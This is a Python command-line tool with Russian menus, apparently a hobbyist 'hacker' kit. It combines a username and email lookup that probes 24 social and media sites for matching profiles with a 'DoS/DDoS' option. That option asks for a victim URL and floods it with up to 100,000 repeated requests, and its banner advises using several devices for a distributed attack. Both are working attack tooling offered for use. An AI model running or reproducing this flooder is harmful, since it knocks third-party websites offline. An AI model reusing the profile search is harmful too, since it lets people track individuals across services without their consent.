import os, sys, time, colorama, requests
fch,fcl,x, cout = colorama.Fore.CYAN, colorama.Fore.RESET, 1, 800
inputc, grebcard, redcard, yellcard, strangecard = f"{fcl}>{fch}>{fcl}> ", f"{colorama.Fore.GREEN}[+]{fcl}", f"{colorama.Fore.RED}[!]{fcl}", f"{colorama.Fore.YELLOW}[-]{fcl}", f"{colorama.Fore.LIGHTBLACK_EX}[unknown thing]{fcl}"
def service(name, link, timeout=3):
    try:
        response = requests.get(link, timeout=3)
        status = response.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) {name}. {status}. {link}") if 100 <= status <= 103 else print(f"{grebcard}(успешно) {name}. {status}. {link}") if 200 <= status <= 206 else print(f"{yellcard}(перенаправление) {name}. {status}. {link}") if 300 <= status <= 308 else print(f"{redcard}(не найдено) {name}. {status}. {link}") if 400 <= status <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) {name}. {status}. {link}") if 500 <= status <= 511 else None
    except:
        print(f"{redcard} ошибка соединения. {name}. {link}")
def vk(): service("VK", vklink)
def tiktok(): service("TikTok", ttlink)
def tg(): service("Telegram", tglink)
def threads(): service("Threads", thredslink)
def spotify(): service("Spotify", spotifylink)
def youtube(): service("YouTube", youtubelink)
def reddit(): service("Reddit", redditlink)
def insta(): service("Instagram", instalink)
def wa(): service("WhatsApp", walink)
def yamusic(): service("Yandex Music", yamusiclink)
def chess(): service("chess.com", chesslink)
def github(): service("GitHub", githublink)
def discord(): service("Discord", dslink)
def duolingo(): service("Duolingo", duolingolink)
def roblox(): service("Roblox", robloxlink)
def facebook(): service("Facebook", facebooklink)
def kwork(): service("Kwork", kworklink)
def steam(): service("Steam", steamlink)
def pornhub(): service("Pornhub", pornhublink)
def twitter(): service("Twitter", twitterlink)
def twitch(): service("Twitch", twitchlink)
def pinterest(): service("Pinterest", pinterestlink)
def tumbrl(): service("Tumblr", tumblrllink)
def soundcloud(): service("SoundCloud", soundcloudlink)
def all_services():
    vk(), tiktok(), tg(), threads(), spotify(), youtube(), reddit(), insta(), wa(), yamusic(), chess(), github(), discord(), duolingo(), roblox(), facebook(), kwork(), steam(), pornhub(), twitter(), twitch(), pinterest(), tumbrl(), soundcloud()
def vvoderr():
    for i in range(1, 5):
        clear()
        print(f"{colorama.Fore.RED}вы ввели неккоректный ответ.\n{fcl}подождите {fch}{5-i} секунд{fcl}")
art1 = f"{fch}░░░░█▐▄▒▒▒▌▌▒▒▌░▌▒▐▐▐▒▒▐▒▒▌▒▀▄▀▄░\n░░░█▐▒▒▀▀▌░▀▀▀░░▀▀▀░░▀▀▄▌▌▐▒▒▒▌▐░\n░░▐▒▒▀▀▄▐░▀▀▄▄░░░░░░░░░░░▐▒▌▒▒▐░▌\n░░▐▒▌▒▒▒▌░▄▄▄▄█▄░░░░░░░▄▄▄▐▐▄▄▀░░\n░░▌▐▒▒▒▐░░░░░░░░░░░░░▀█▄░░░░▌▌░░░\n▄▀▒▒▌▒▒▐░░░░░░░▄░░▄░░░░░▀▀░░▌▌░░░{" "*12}{fcl}loading...{fch}\n▄▄▀▒▐▒▒▐░░░░░░░▐▀▀▀▄▄▀░░░░░░▌▌░░░\n░░░░█▌▒▒▌░░░░░▐▒▒▒▒▒▌░░░░░░▐▐▒▀▀▄\n░░▄▀▒▒▒▒▐░░░░░▐▒▒▒▒▐░░░░░▄█▄▒▐▒▒▒\n▄▀▒▒▒▒▒▄██▀▄▄░░▀▄▄▀░░▄▄▀█▄░█▀▒▒▒▒{fcl}"
def printslow_slow(text):
    for letter in text:
        print(letter, end="", flush=True)
        time.sleep(0.03)
def printslow_fast(text):
    for letter in text:
        print(letter, end="", flush=True)
        time.sleep(0.0003)
def clear(): os.system("clear" if os.name != "nt" else "cls")
def main():
    global fch, cout, inputc
    while True:
        clear()
        printslow_slow(f'{colorama.Fore.BLUE}░█░█░█▀▀░█▀█░█▀▄░░░█▀█░█▀▀░░░█▀▄░█▀▀░█▀█░█▀▄\n{colorama.Fore.LIGHTBLUE_EX}░█▀█░█▀▀░█▀█░█░█░░░█░█░█▀▀░░░█░█░█▀▀░█▀█░█░█\n{colorama.Fore.CYAN}░▀░▀░▀▀▀░▀░▀░▀▀░░░░▀▀▀░▀░░░░░▀▀░░▀▀▀░▀░▀░▀▀░  {colorama.Fore.LIGHTBLACK_EX}v3\n{colorama.Fore.LIGHTBLACK_EX}{" "*15}by @zevxsis{fcl}\n\n{" "*10}{time.ctime()}\n{" "*3}+-----------------------------------+\n{" "*3}| 1 - {fch}𝖔𝖘𝖎𝖓𝖙{fcl}       3 - {fch}𝖎𝖓𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖔𝖓{fcl}   |\n{" "*3}| 2 - {fch}𝕯𝕯𝖔𝖘/𝕯𝖔𝖘{fcl}    4 - {fch}𝖘𝖊𝖙𝖙𝖎𝖓𝖌𝖘{fcl}      |\n{" "*3}|           q - {fch}𝖊𝖝𝖎𝖙{fcl}                |\n{" "*3}+-----------------------------------+\n')
        snoschoice = input(inputc)
        clear()
        if snoschoice == "q":
            sys.exit()
        elif snoschoice == "2":
            while True:
                clear()
                printslow_fast(f'{fch}⡿⣼⡿⣑⠛⣡⡆⠄⠄⠄⠄⠈⠙⢷⡹⣿⣿⣿⡿⢣⣿⣫⣾⣿⣿⣿⣿{" " * 20}{fcl}ℤ𝔼𝕍𝕏𝕊𝕀𝕊 𝔻𝕆𝕊/𝔻𝔻𝕆𝕊\n{fch}⢳⣿⣱⣿⡆⣿⠄⠄⠄⠄⠄⠄⠄⠸⣧⢹⣿⡟⣱⡟⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}+------------=={fch}WARN{fcl}1{fch}NG{fcl}==------------+\n{fch}⢸⣧⣿⣿⡇⢿⣀⠄⠄⠄⠄⣄⣼⡆⣹⡆⢩⡾⣡⣾⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}| сносит только {fch}слабозащищенные     {fcl}|\n{fch}⢸⣿⣿⣿⣿⣄⠻⣶⣶⣶⣶⡿⠿⠃⠋⢔⣩⣾⣿⣿⣿⣿⣿⣿⠿⣫⣵{fcl}{" " * 10}| сайты или сделанные через         |\n{fch}⣌⠁⠻⣿⣿⣿⣷⣶⣦⣤⣶⣶⡯⢠⣾⣿⣿⣿⣿⡿⠿⢟⣫⣵⣿⣿⡿{fcl}{" " * 10}| вайбкодинг.                       |\n{fch}⢿⣷⣦⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣆⣀⣒⣚⡛⠋⠉⠉⠄⢀{fcl}{" " * 10}| количество спама можно выбрать    |\n{fch}⢼⣿⣿⣿⣿⣿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⠤⠄⠄⢀⣀⣠⣾{fcl}{" " * 10}| {fch}в настройках{colorama.Fore.LIGHTBLACK_EX} не рекомендуется     {fcl}|\n{fch}⠷⠾⠭⢭⣉⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣏⡻⢶⣦⣤⠴⢿⠋⠁{fcl}{" " * 10}| ставить слишком большое кол-во    |\n{fch}⡲⣝⢿⣿⣿⣿⡿⣛⣩⣭⡉⠻⣿⣿⣿⣿⣴⣿⣿⣿⣷⣶⡾⠋⠁⢀⣤{fcl}{" " * 10}| ({colorama.Fore.LIGHTBLACK_EX}можно убить роутер{fcl}){fcl}              |\n{fch}⣿⢸⣷⡝⣿⣿⢸⣿⣿⣿⣿⠄⠄⣹⣿⣿⣿⣿⣿⣯⣛⠟⠁⠴⠾⠿⣛{fcl}{" "*10}| для ддос атаки используйте        |\n{fch}⣿⣼⣿⣟⢧⣿⣮⣝⣛⣉⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⠋⣸⣿⣿⣿⣿⣿{fcl}{" " * 10}| несколько устройств               |\n{fch}⣿⡿⢣⣿⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⣡⣾⣿⣿⣿⠿⣛⡭{fcl}{" " * 10}+-----------------------{fch}zevxsis{fcl}-----+\n\n')
                printslow_fast(f"{fch}впиши URL сайта жертвы:\n")
                victim = input(inputc).strip()
                clear()
                d = 1
                while d != cout:
                    try:
                        r = requests.get(victim)
                        print(f"{d}/{cout} {r.status_code}нормалды {grebcard}")
                        d += 1
                    except: print(f"{d}/{cout}сайта нема {redcard}")
                break
        elif snoschoice == "1":
            while True:
                clear()
                print(f'+--=={fch}выбери вариант поиска:{fcl}==--+\n|  1 - {fch}поиск по юзу{fcl}{" " * 12}|\n|  2 - {fch}поиск по почте{fcl}{" " * 10}|\n|{" " * 8}q - назад{" " * 13}|\n+------------------------------+\n')
                BOOchoice = input(inputc)
                clear()
                if BOOchoice == "1":
                    user = input(f"введите {fch}юзер:{fcl}\n{inputc}@").strip()
                elif BOOchoice == "2":
                    user2 = input(f"введите {fch}почту:{fcl}\n{inputc} ")
                    user = user2.split("@")[0]
                elif BOOchoice == "q":
                    break
                else: vvoderr()
                global vklink, ttlink, tglink, thredslink, spotifylink, youtubelink, redditlink, instalink, walink, yamusiclink, chesslink, githublink, dslink, duolingolink, robloxlink, facebooklink, kworklink, steamlink, pornhublink, twitterlink, twitchlink,pinterestlink,tumblrllink,soundcloudlink
                vklink,ttlink,tglink,thredslink,spotifylink,youtubelink,redditlink,instalink,walink,yamusiclink,chesslink,githublink,dslink,duolingolink,robloxlink,facebooklink,kworklink,steamlink,pornhublink,twitterlink,twitchlink,pinterestlink,tumblrllink,soundcloudlink=f"https://vk.ru/{user}",f"https://www.tiktok.com/@{user}",f"https://t.me/{user}",f"https://www.threads.net/@{user}",f"https://open.spotify.com/user/{user}",f"https://www.youtube.com/@{user}",f"https://www.reddit.com/user/{user}",f"https://www.instagram.com/{user}",f"https://www.whatsapp.com/@{user}",f"https://music.yandex/{user}/playlists",f"https://www.chess.com/member/{user}",f"https://github.com/{user}",f"https://discord.com/users/{user}",f"https://www.duolingo.com/profile/{user}",f"https://www.roblox.com/user.aspx?username={user}",f"https://www.facebook.com/{user}",f"https://kwork.ru/user/{user}",f"https://steamcommunity.com/id/{user}",f"https://www.pornhub.com/users/{user}",f"https://twitter.com/{user}",f"https://www.twitch.tv/{user}",f"https://www.pinterest.com/{user}",f"https://www.tumblr.com/{user}",f"https://soundcloud.com/{user}"
                clear()
                printslow_fast(f'{fch}⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿{" " * 19}{fcl}Z E V X S {fch}I{fcl} S   O S {fch}I{fcl} N T\n{fch}⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿{fcl}{" " * 10}+-----------==={fch}CHOOSE MEDIA:{fcl}===------------+\n{fch}⢸⣿⣷⣧⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉{fcl}{" " * 9}| 1. {fch}VK{fcl}       9. {fch}Reddit{fcl}    17. {fch}Discord{fcl}     |\n{fch}⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀{fcl}{" " * 9}| 2. {fch}TikTok{fcl}   10. {fch}Instagram{fcl} 18. {fch}Duolingo{fcl}   |\n{fch}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣿⣴{fcl}{" " * 10}| 3. {fch}Telegram{fcl} 11. {fch}WhatsApp{fcl}  19. {fch}Roblox{fcl}     |\n{fch}⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}| 4. {fch}Threads{fcl}  12. {fch}Yamusic{fcl}   20. {fch}Facebook{fcl}   |\n{fch}⣦⣌⣛⣻⣿⣿⣧⠙⣿⣿⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄{fcl}{" " * 8}| 5. {fch}Spotify{fcl}  13. {fch}Chess{fcl}     21. {fch}Kwork{fcl}      |\n{fch}⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾{fcl}{" " * 10}| 6. {fch}YouTube{fcl}  14. {fch}GitHub{fcl}    22. {fch}Steam{fcl}      |\n{fch}⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄{fcl}{" " * 8}| 7. {fch}Pornhub{fcl}  15. {fch}Twitch{fcl}  23. {fch}Pinterest{fcl}    |\n{fch}⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁{fcl}{" " * 11}| 8. {fch}Soundcloud{fcl} 16. {fch}Twitter{fcl} 24. {fch}Tumbrl{fcl}     |\n{fch}⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄{fcl}{" " * 12}|{" "*17}nh - {fch}all{fcl}{" "*17}|\n{fch}⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄{fcl}{" "*15}|{" "*17}b - {fch}back{fcl}{" "*17}|\n{" "*36}+--------------------------------{fch}zevxsis{fcl}----+\n')
                osintchoice1 = input(f"{" " * 37}{inputc}").strip().lower()
                clear()
                if osintchoice1 == "b":
                    break
                vk() if osintchoice1 == "1" else tiktok() if osintchoice1 == "2" else tg() if osintchoice1 == "3" else threads() if osintchoice1 == "4" else spotify() if osintchoice1 == "5" else youtube() if osintchoice1 == "6" else pornhub() if osintchoice1 == "7" else soundcloud() if osintchoice1 == "8" else reddit() if osintchoice1 == "9" else insta() if osintchoice1 == "10" else wa() if osintchoice1 == "11" else yamusic() if osintchoice1 == "12" else chess() if osintchoice1 == "13" else github() if osintchoice1 == "14" else twitch() if osintchoice1 == "15" else twitter() if osintchoice1 == "16" else discord() if osintchoice1 == "17" else duolingo() if osintchoice1 == "18" else roblox() if osintchoice1 == "19" else facebook() if osintchoice1 == "20" else kwork() if osintchoice1 == "21" else steam() if osintchoice1 == "22" else pinterest() if osintchoice1 == "23" else tumbrl() if osintchoice1 == "24" else all_services() if osintchoice1 == "nh" else vvoderr()
                input(f"\n{fcl}жми любую кнопку, чтоб выйти\n{inputc}")
                break
        elif snoschoice == "3":
            while True:
                printslow_slow(f'+------------------==={fch}INF{fcl}O{fch}RMAT{fcl}I{fch}ON{fcl}===-----------------+\n|  {fcl}создатель: @{fch}zevxs{fcl}i{fch}s{fcl}{" " * 31}|\n|  тг канал: @{fch}tembededd{fcl}{" " * 30}|\n|  github: {fch}z{fcl}e{fch}vx{fcl}syy{" "*35}|\n|  время писания {fch}v1{fcl}: {fch}11{fcl}h {fch}19{fcl}min{fcl}{" " * 23}|\n|  время писания {fch}v2{fcl}: {fch}6{fcl}h {fch}54{fcl}min{fcl}{" "*24}|\n|  время писания {fch}v3{fcl}: {fch}2{fcl}h {fch}11{fcl}min{" "*24}|\n|  короче барни, 0 ии. пользуйтесь на здоровье{" " * 7}|\n+----------------------------------------{fch}zevxsis{fcl}-----+\n')
                input(f"{fcl}жми любую кнопку, чтоб выйти\n{inputc}")
                break
        elif snoschoice == "4":
            while True:
                clear()
                printslow_fast(f'+------------=={fch}SETT{fcl}1{fch}NGS{fcl}==------------+\n|  1 - {fch}изменить цвет текста{fcl}{" "*10}|\n|  2 - {fch}изменить колво спама в dos{fcl}{" "*4}|\n| (может повлиять на работу роутера) |\n|  b - {fch}back{fcl}{" "*26}|\n+-------------------------{fch}zevxs{fcl}i{fch}s{fcl}----+\n\n')
                setchoice1 = input(inputc).strip()
                clear()
                if setchoice1 == "b":
                    break
                elif setchoice1 == "1":
                    printslow_fast(f"{fcl}1 - {colorama.Fore.RED}красный\n{fcl}2 - {colorama.Fore.GREEN}зеленый\n{fcl}3 - {colorama.Fore.YELLOW}желтый\n{fcl}4 - {colorama.Fore.BLUE}синий\n{fcl}5 - {colorama.Fore.MAGENTA}пурпурный\n{fcl}6 - {colorama.Fore.CYAN}голубой\n{fcl}7 - {colorama.Fore.WHITE}белый\n{fcl}8 - {colorama.Fore.LIGHTBLACK_EX}серый\n{fcl}9 - {colorama.Fore.LIGHTBLUE_EX}ярко синий\n{fcl}10 - {colorama.Fore.LIGHTCYAN_EX}ярко голубой\n{fcl}11 - {colorama.Fore.LIGHTGREEN_EX}ярко зеленый\n{fcl}12 - {colorama.Fore.LIGHTMAGENTA_EX}\n{fcl}13 - {colorama.Fore.LIGHTRED_EX}ярко красный\n{fcl}14 - {colorama.Fore.LIGHTYELLOW_EX}ярко желтый{fcl}\n\n")
                    try:
                        color = int(input(inputc))
                        colors = {
                            1: colorama.Fore.RED,
                            2: colorama.Fore.GREEN,
                            3: colorama.Fore.YELLOW,
                            4: colorama.Fore.BLUE,
                            5: colorama.Fore.MAGENTA,
                            6: colorama.Fore.CYAN,
                            7: colorama.Fore.WHITE,
                            8: colorama.Fore.LIGHTBLACK_EX,
                            9: colorama.Fore.LIGHTBLUE_EX,
                            10: colorama.Fore.LIGHTCYAN_EX,
                            11: colorama.Fore.LIGHTGREEN_EX,
                            12: colorama.Fore.LIGHTMAGENTA_EX,
                            13: colorama.Fore.LIGHTRED_EX,
                            14: colorama.Fore.LIGHTYELLOW_EX
                        }
                        if color in colors:
                            fch = colors[color]
                            inputc = f"{fcl}>{fch}>{fcl}> "
                        else: vvoderr()
                    except ValueError: vvoderr()
                elif setchoice1 == "2":
                    printslow_fast(f"введи количество {fch}спама в dos{fcl}\n{colorama.Fore.LIGHTBLACK_EX}мин 0 макс 100000{fcl}\nсейчас:{fch}{cout}{fcl}\n")
                    try:
                        setchoice3 = int(input(inputc))
                        clear()
                        if setchoice3 > 100000 or setchoice3 < 0: vvoderr()
                        else:
                            cout = setchoice3
                            print(f"{grebcard}успешно\nколво теперь: {cout}")
                            time.sleep(2)
                            break
                    except ValueError: vvoderr()
                else: vvoderr()
        else: vvoderr()
def boot():
    clear()
    log = f"-{colorama.Fore.LIGHTMAGENTA_EX}ZEVXSIS{fcl}-{colorama.Fore.LIGHTRED_EX}HEAD{fcl}-{colorama.Fore.LIGHTBLUE_EX}OF{fcl}-{colorama.Fore.LIGHTGREEN_EX}DEAD{fcl}"
    printslow_fast(f"{fch}{log*400}{fcl}")
    time.sleep(2)
    clear()
    printslow_fast(f"{fch}{art1}{fcl}")
    time.sleep(6)
    clear()
    main()
boot()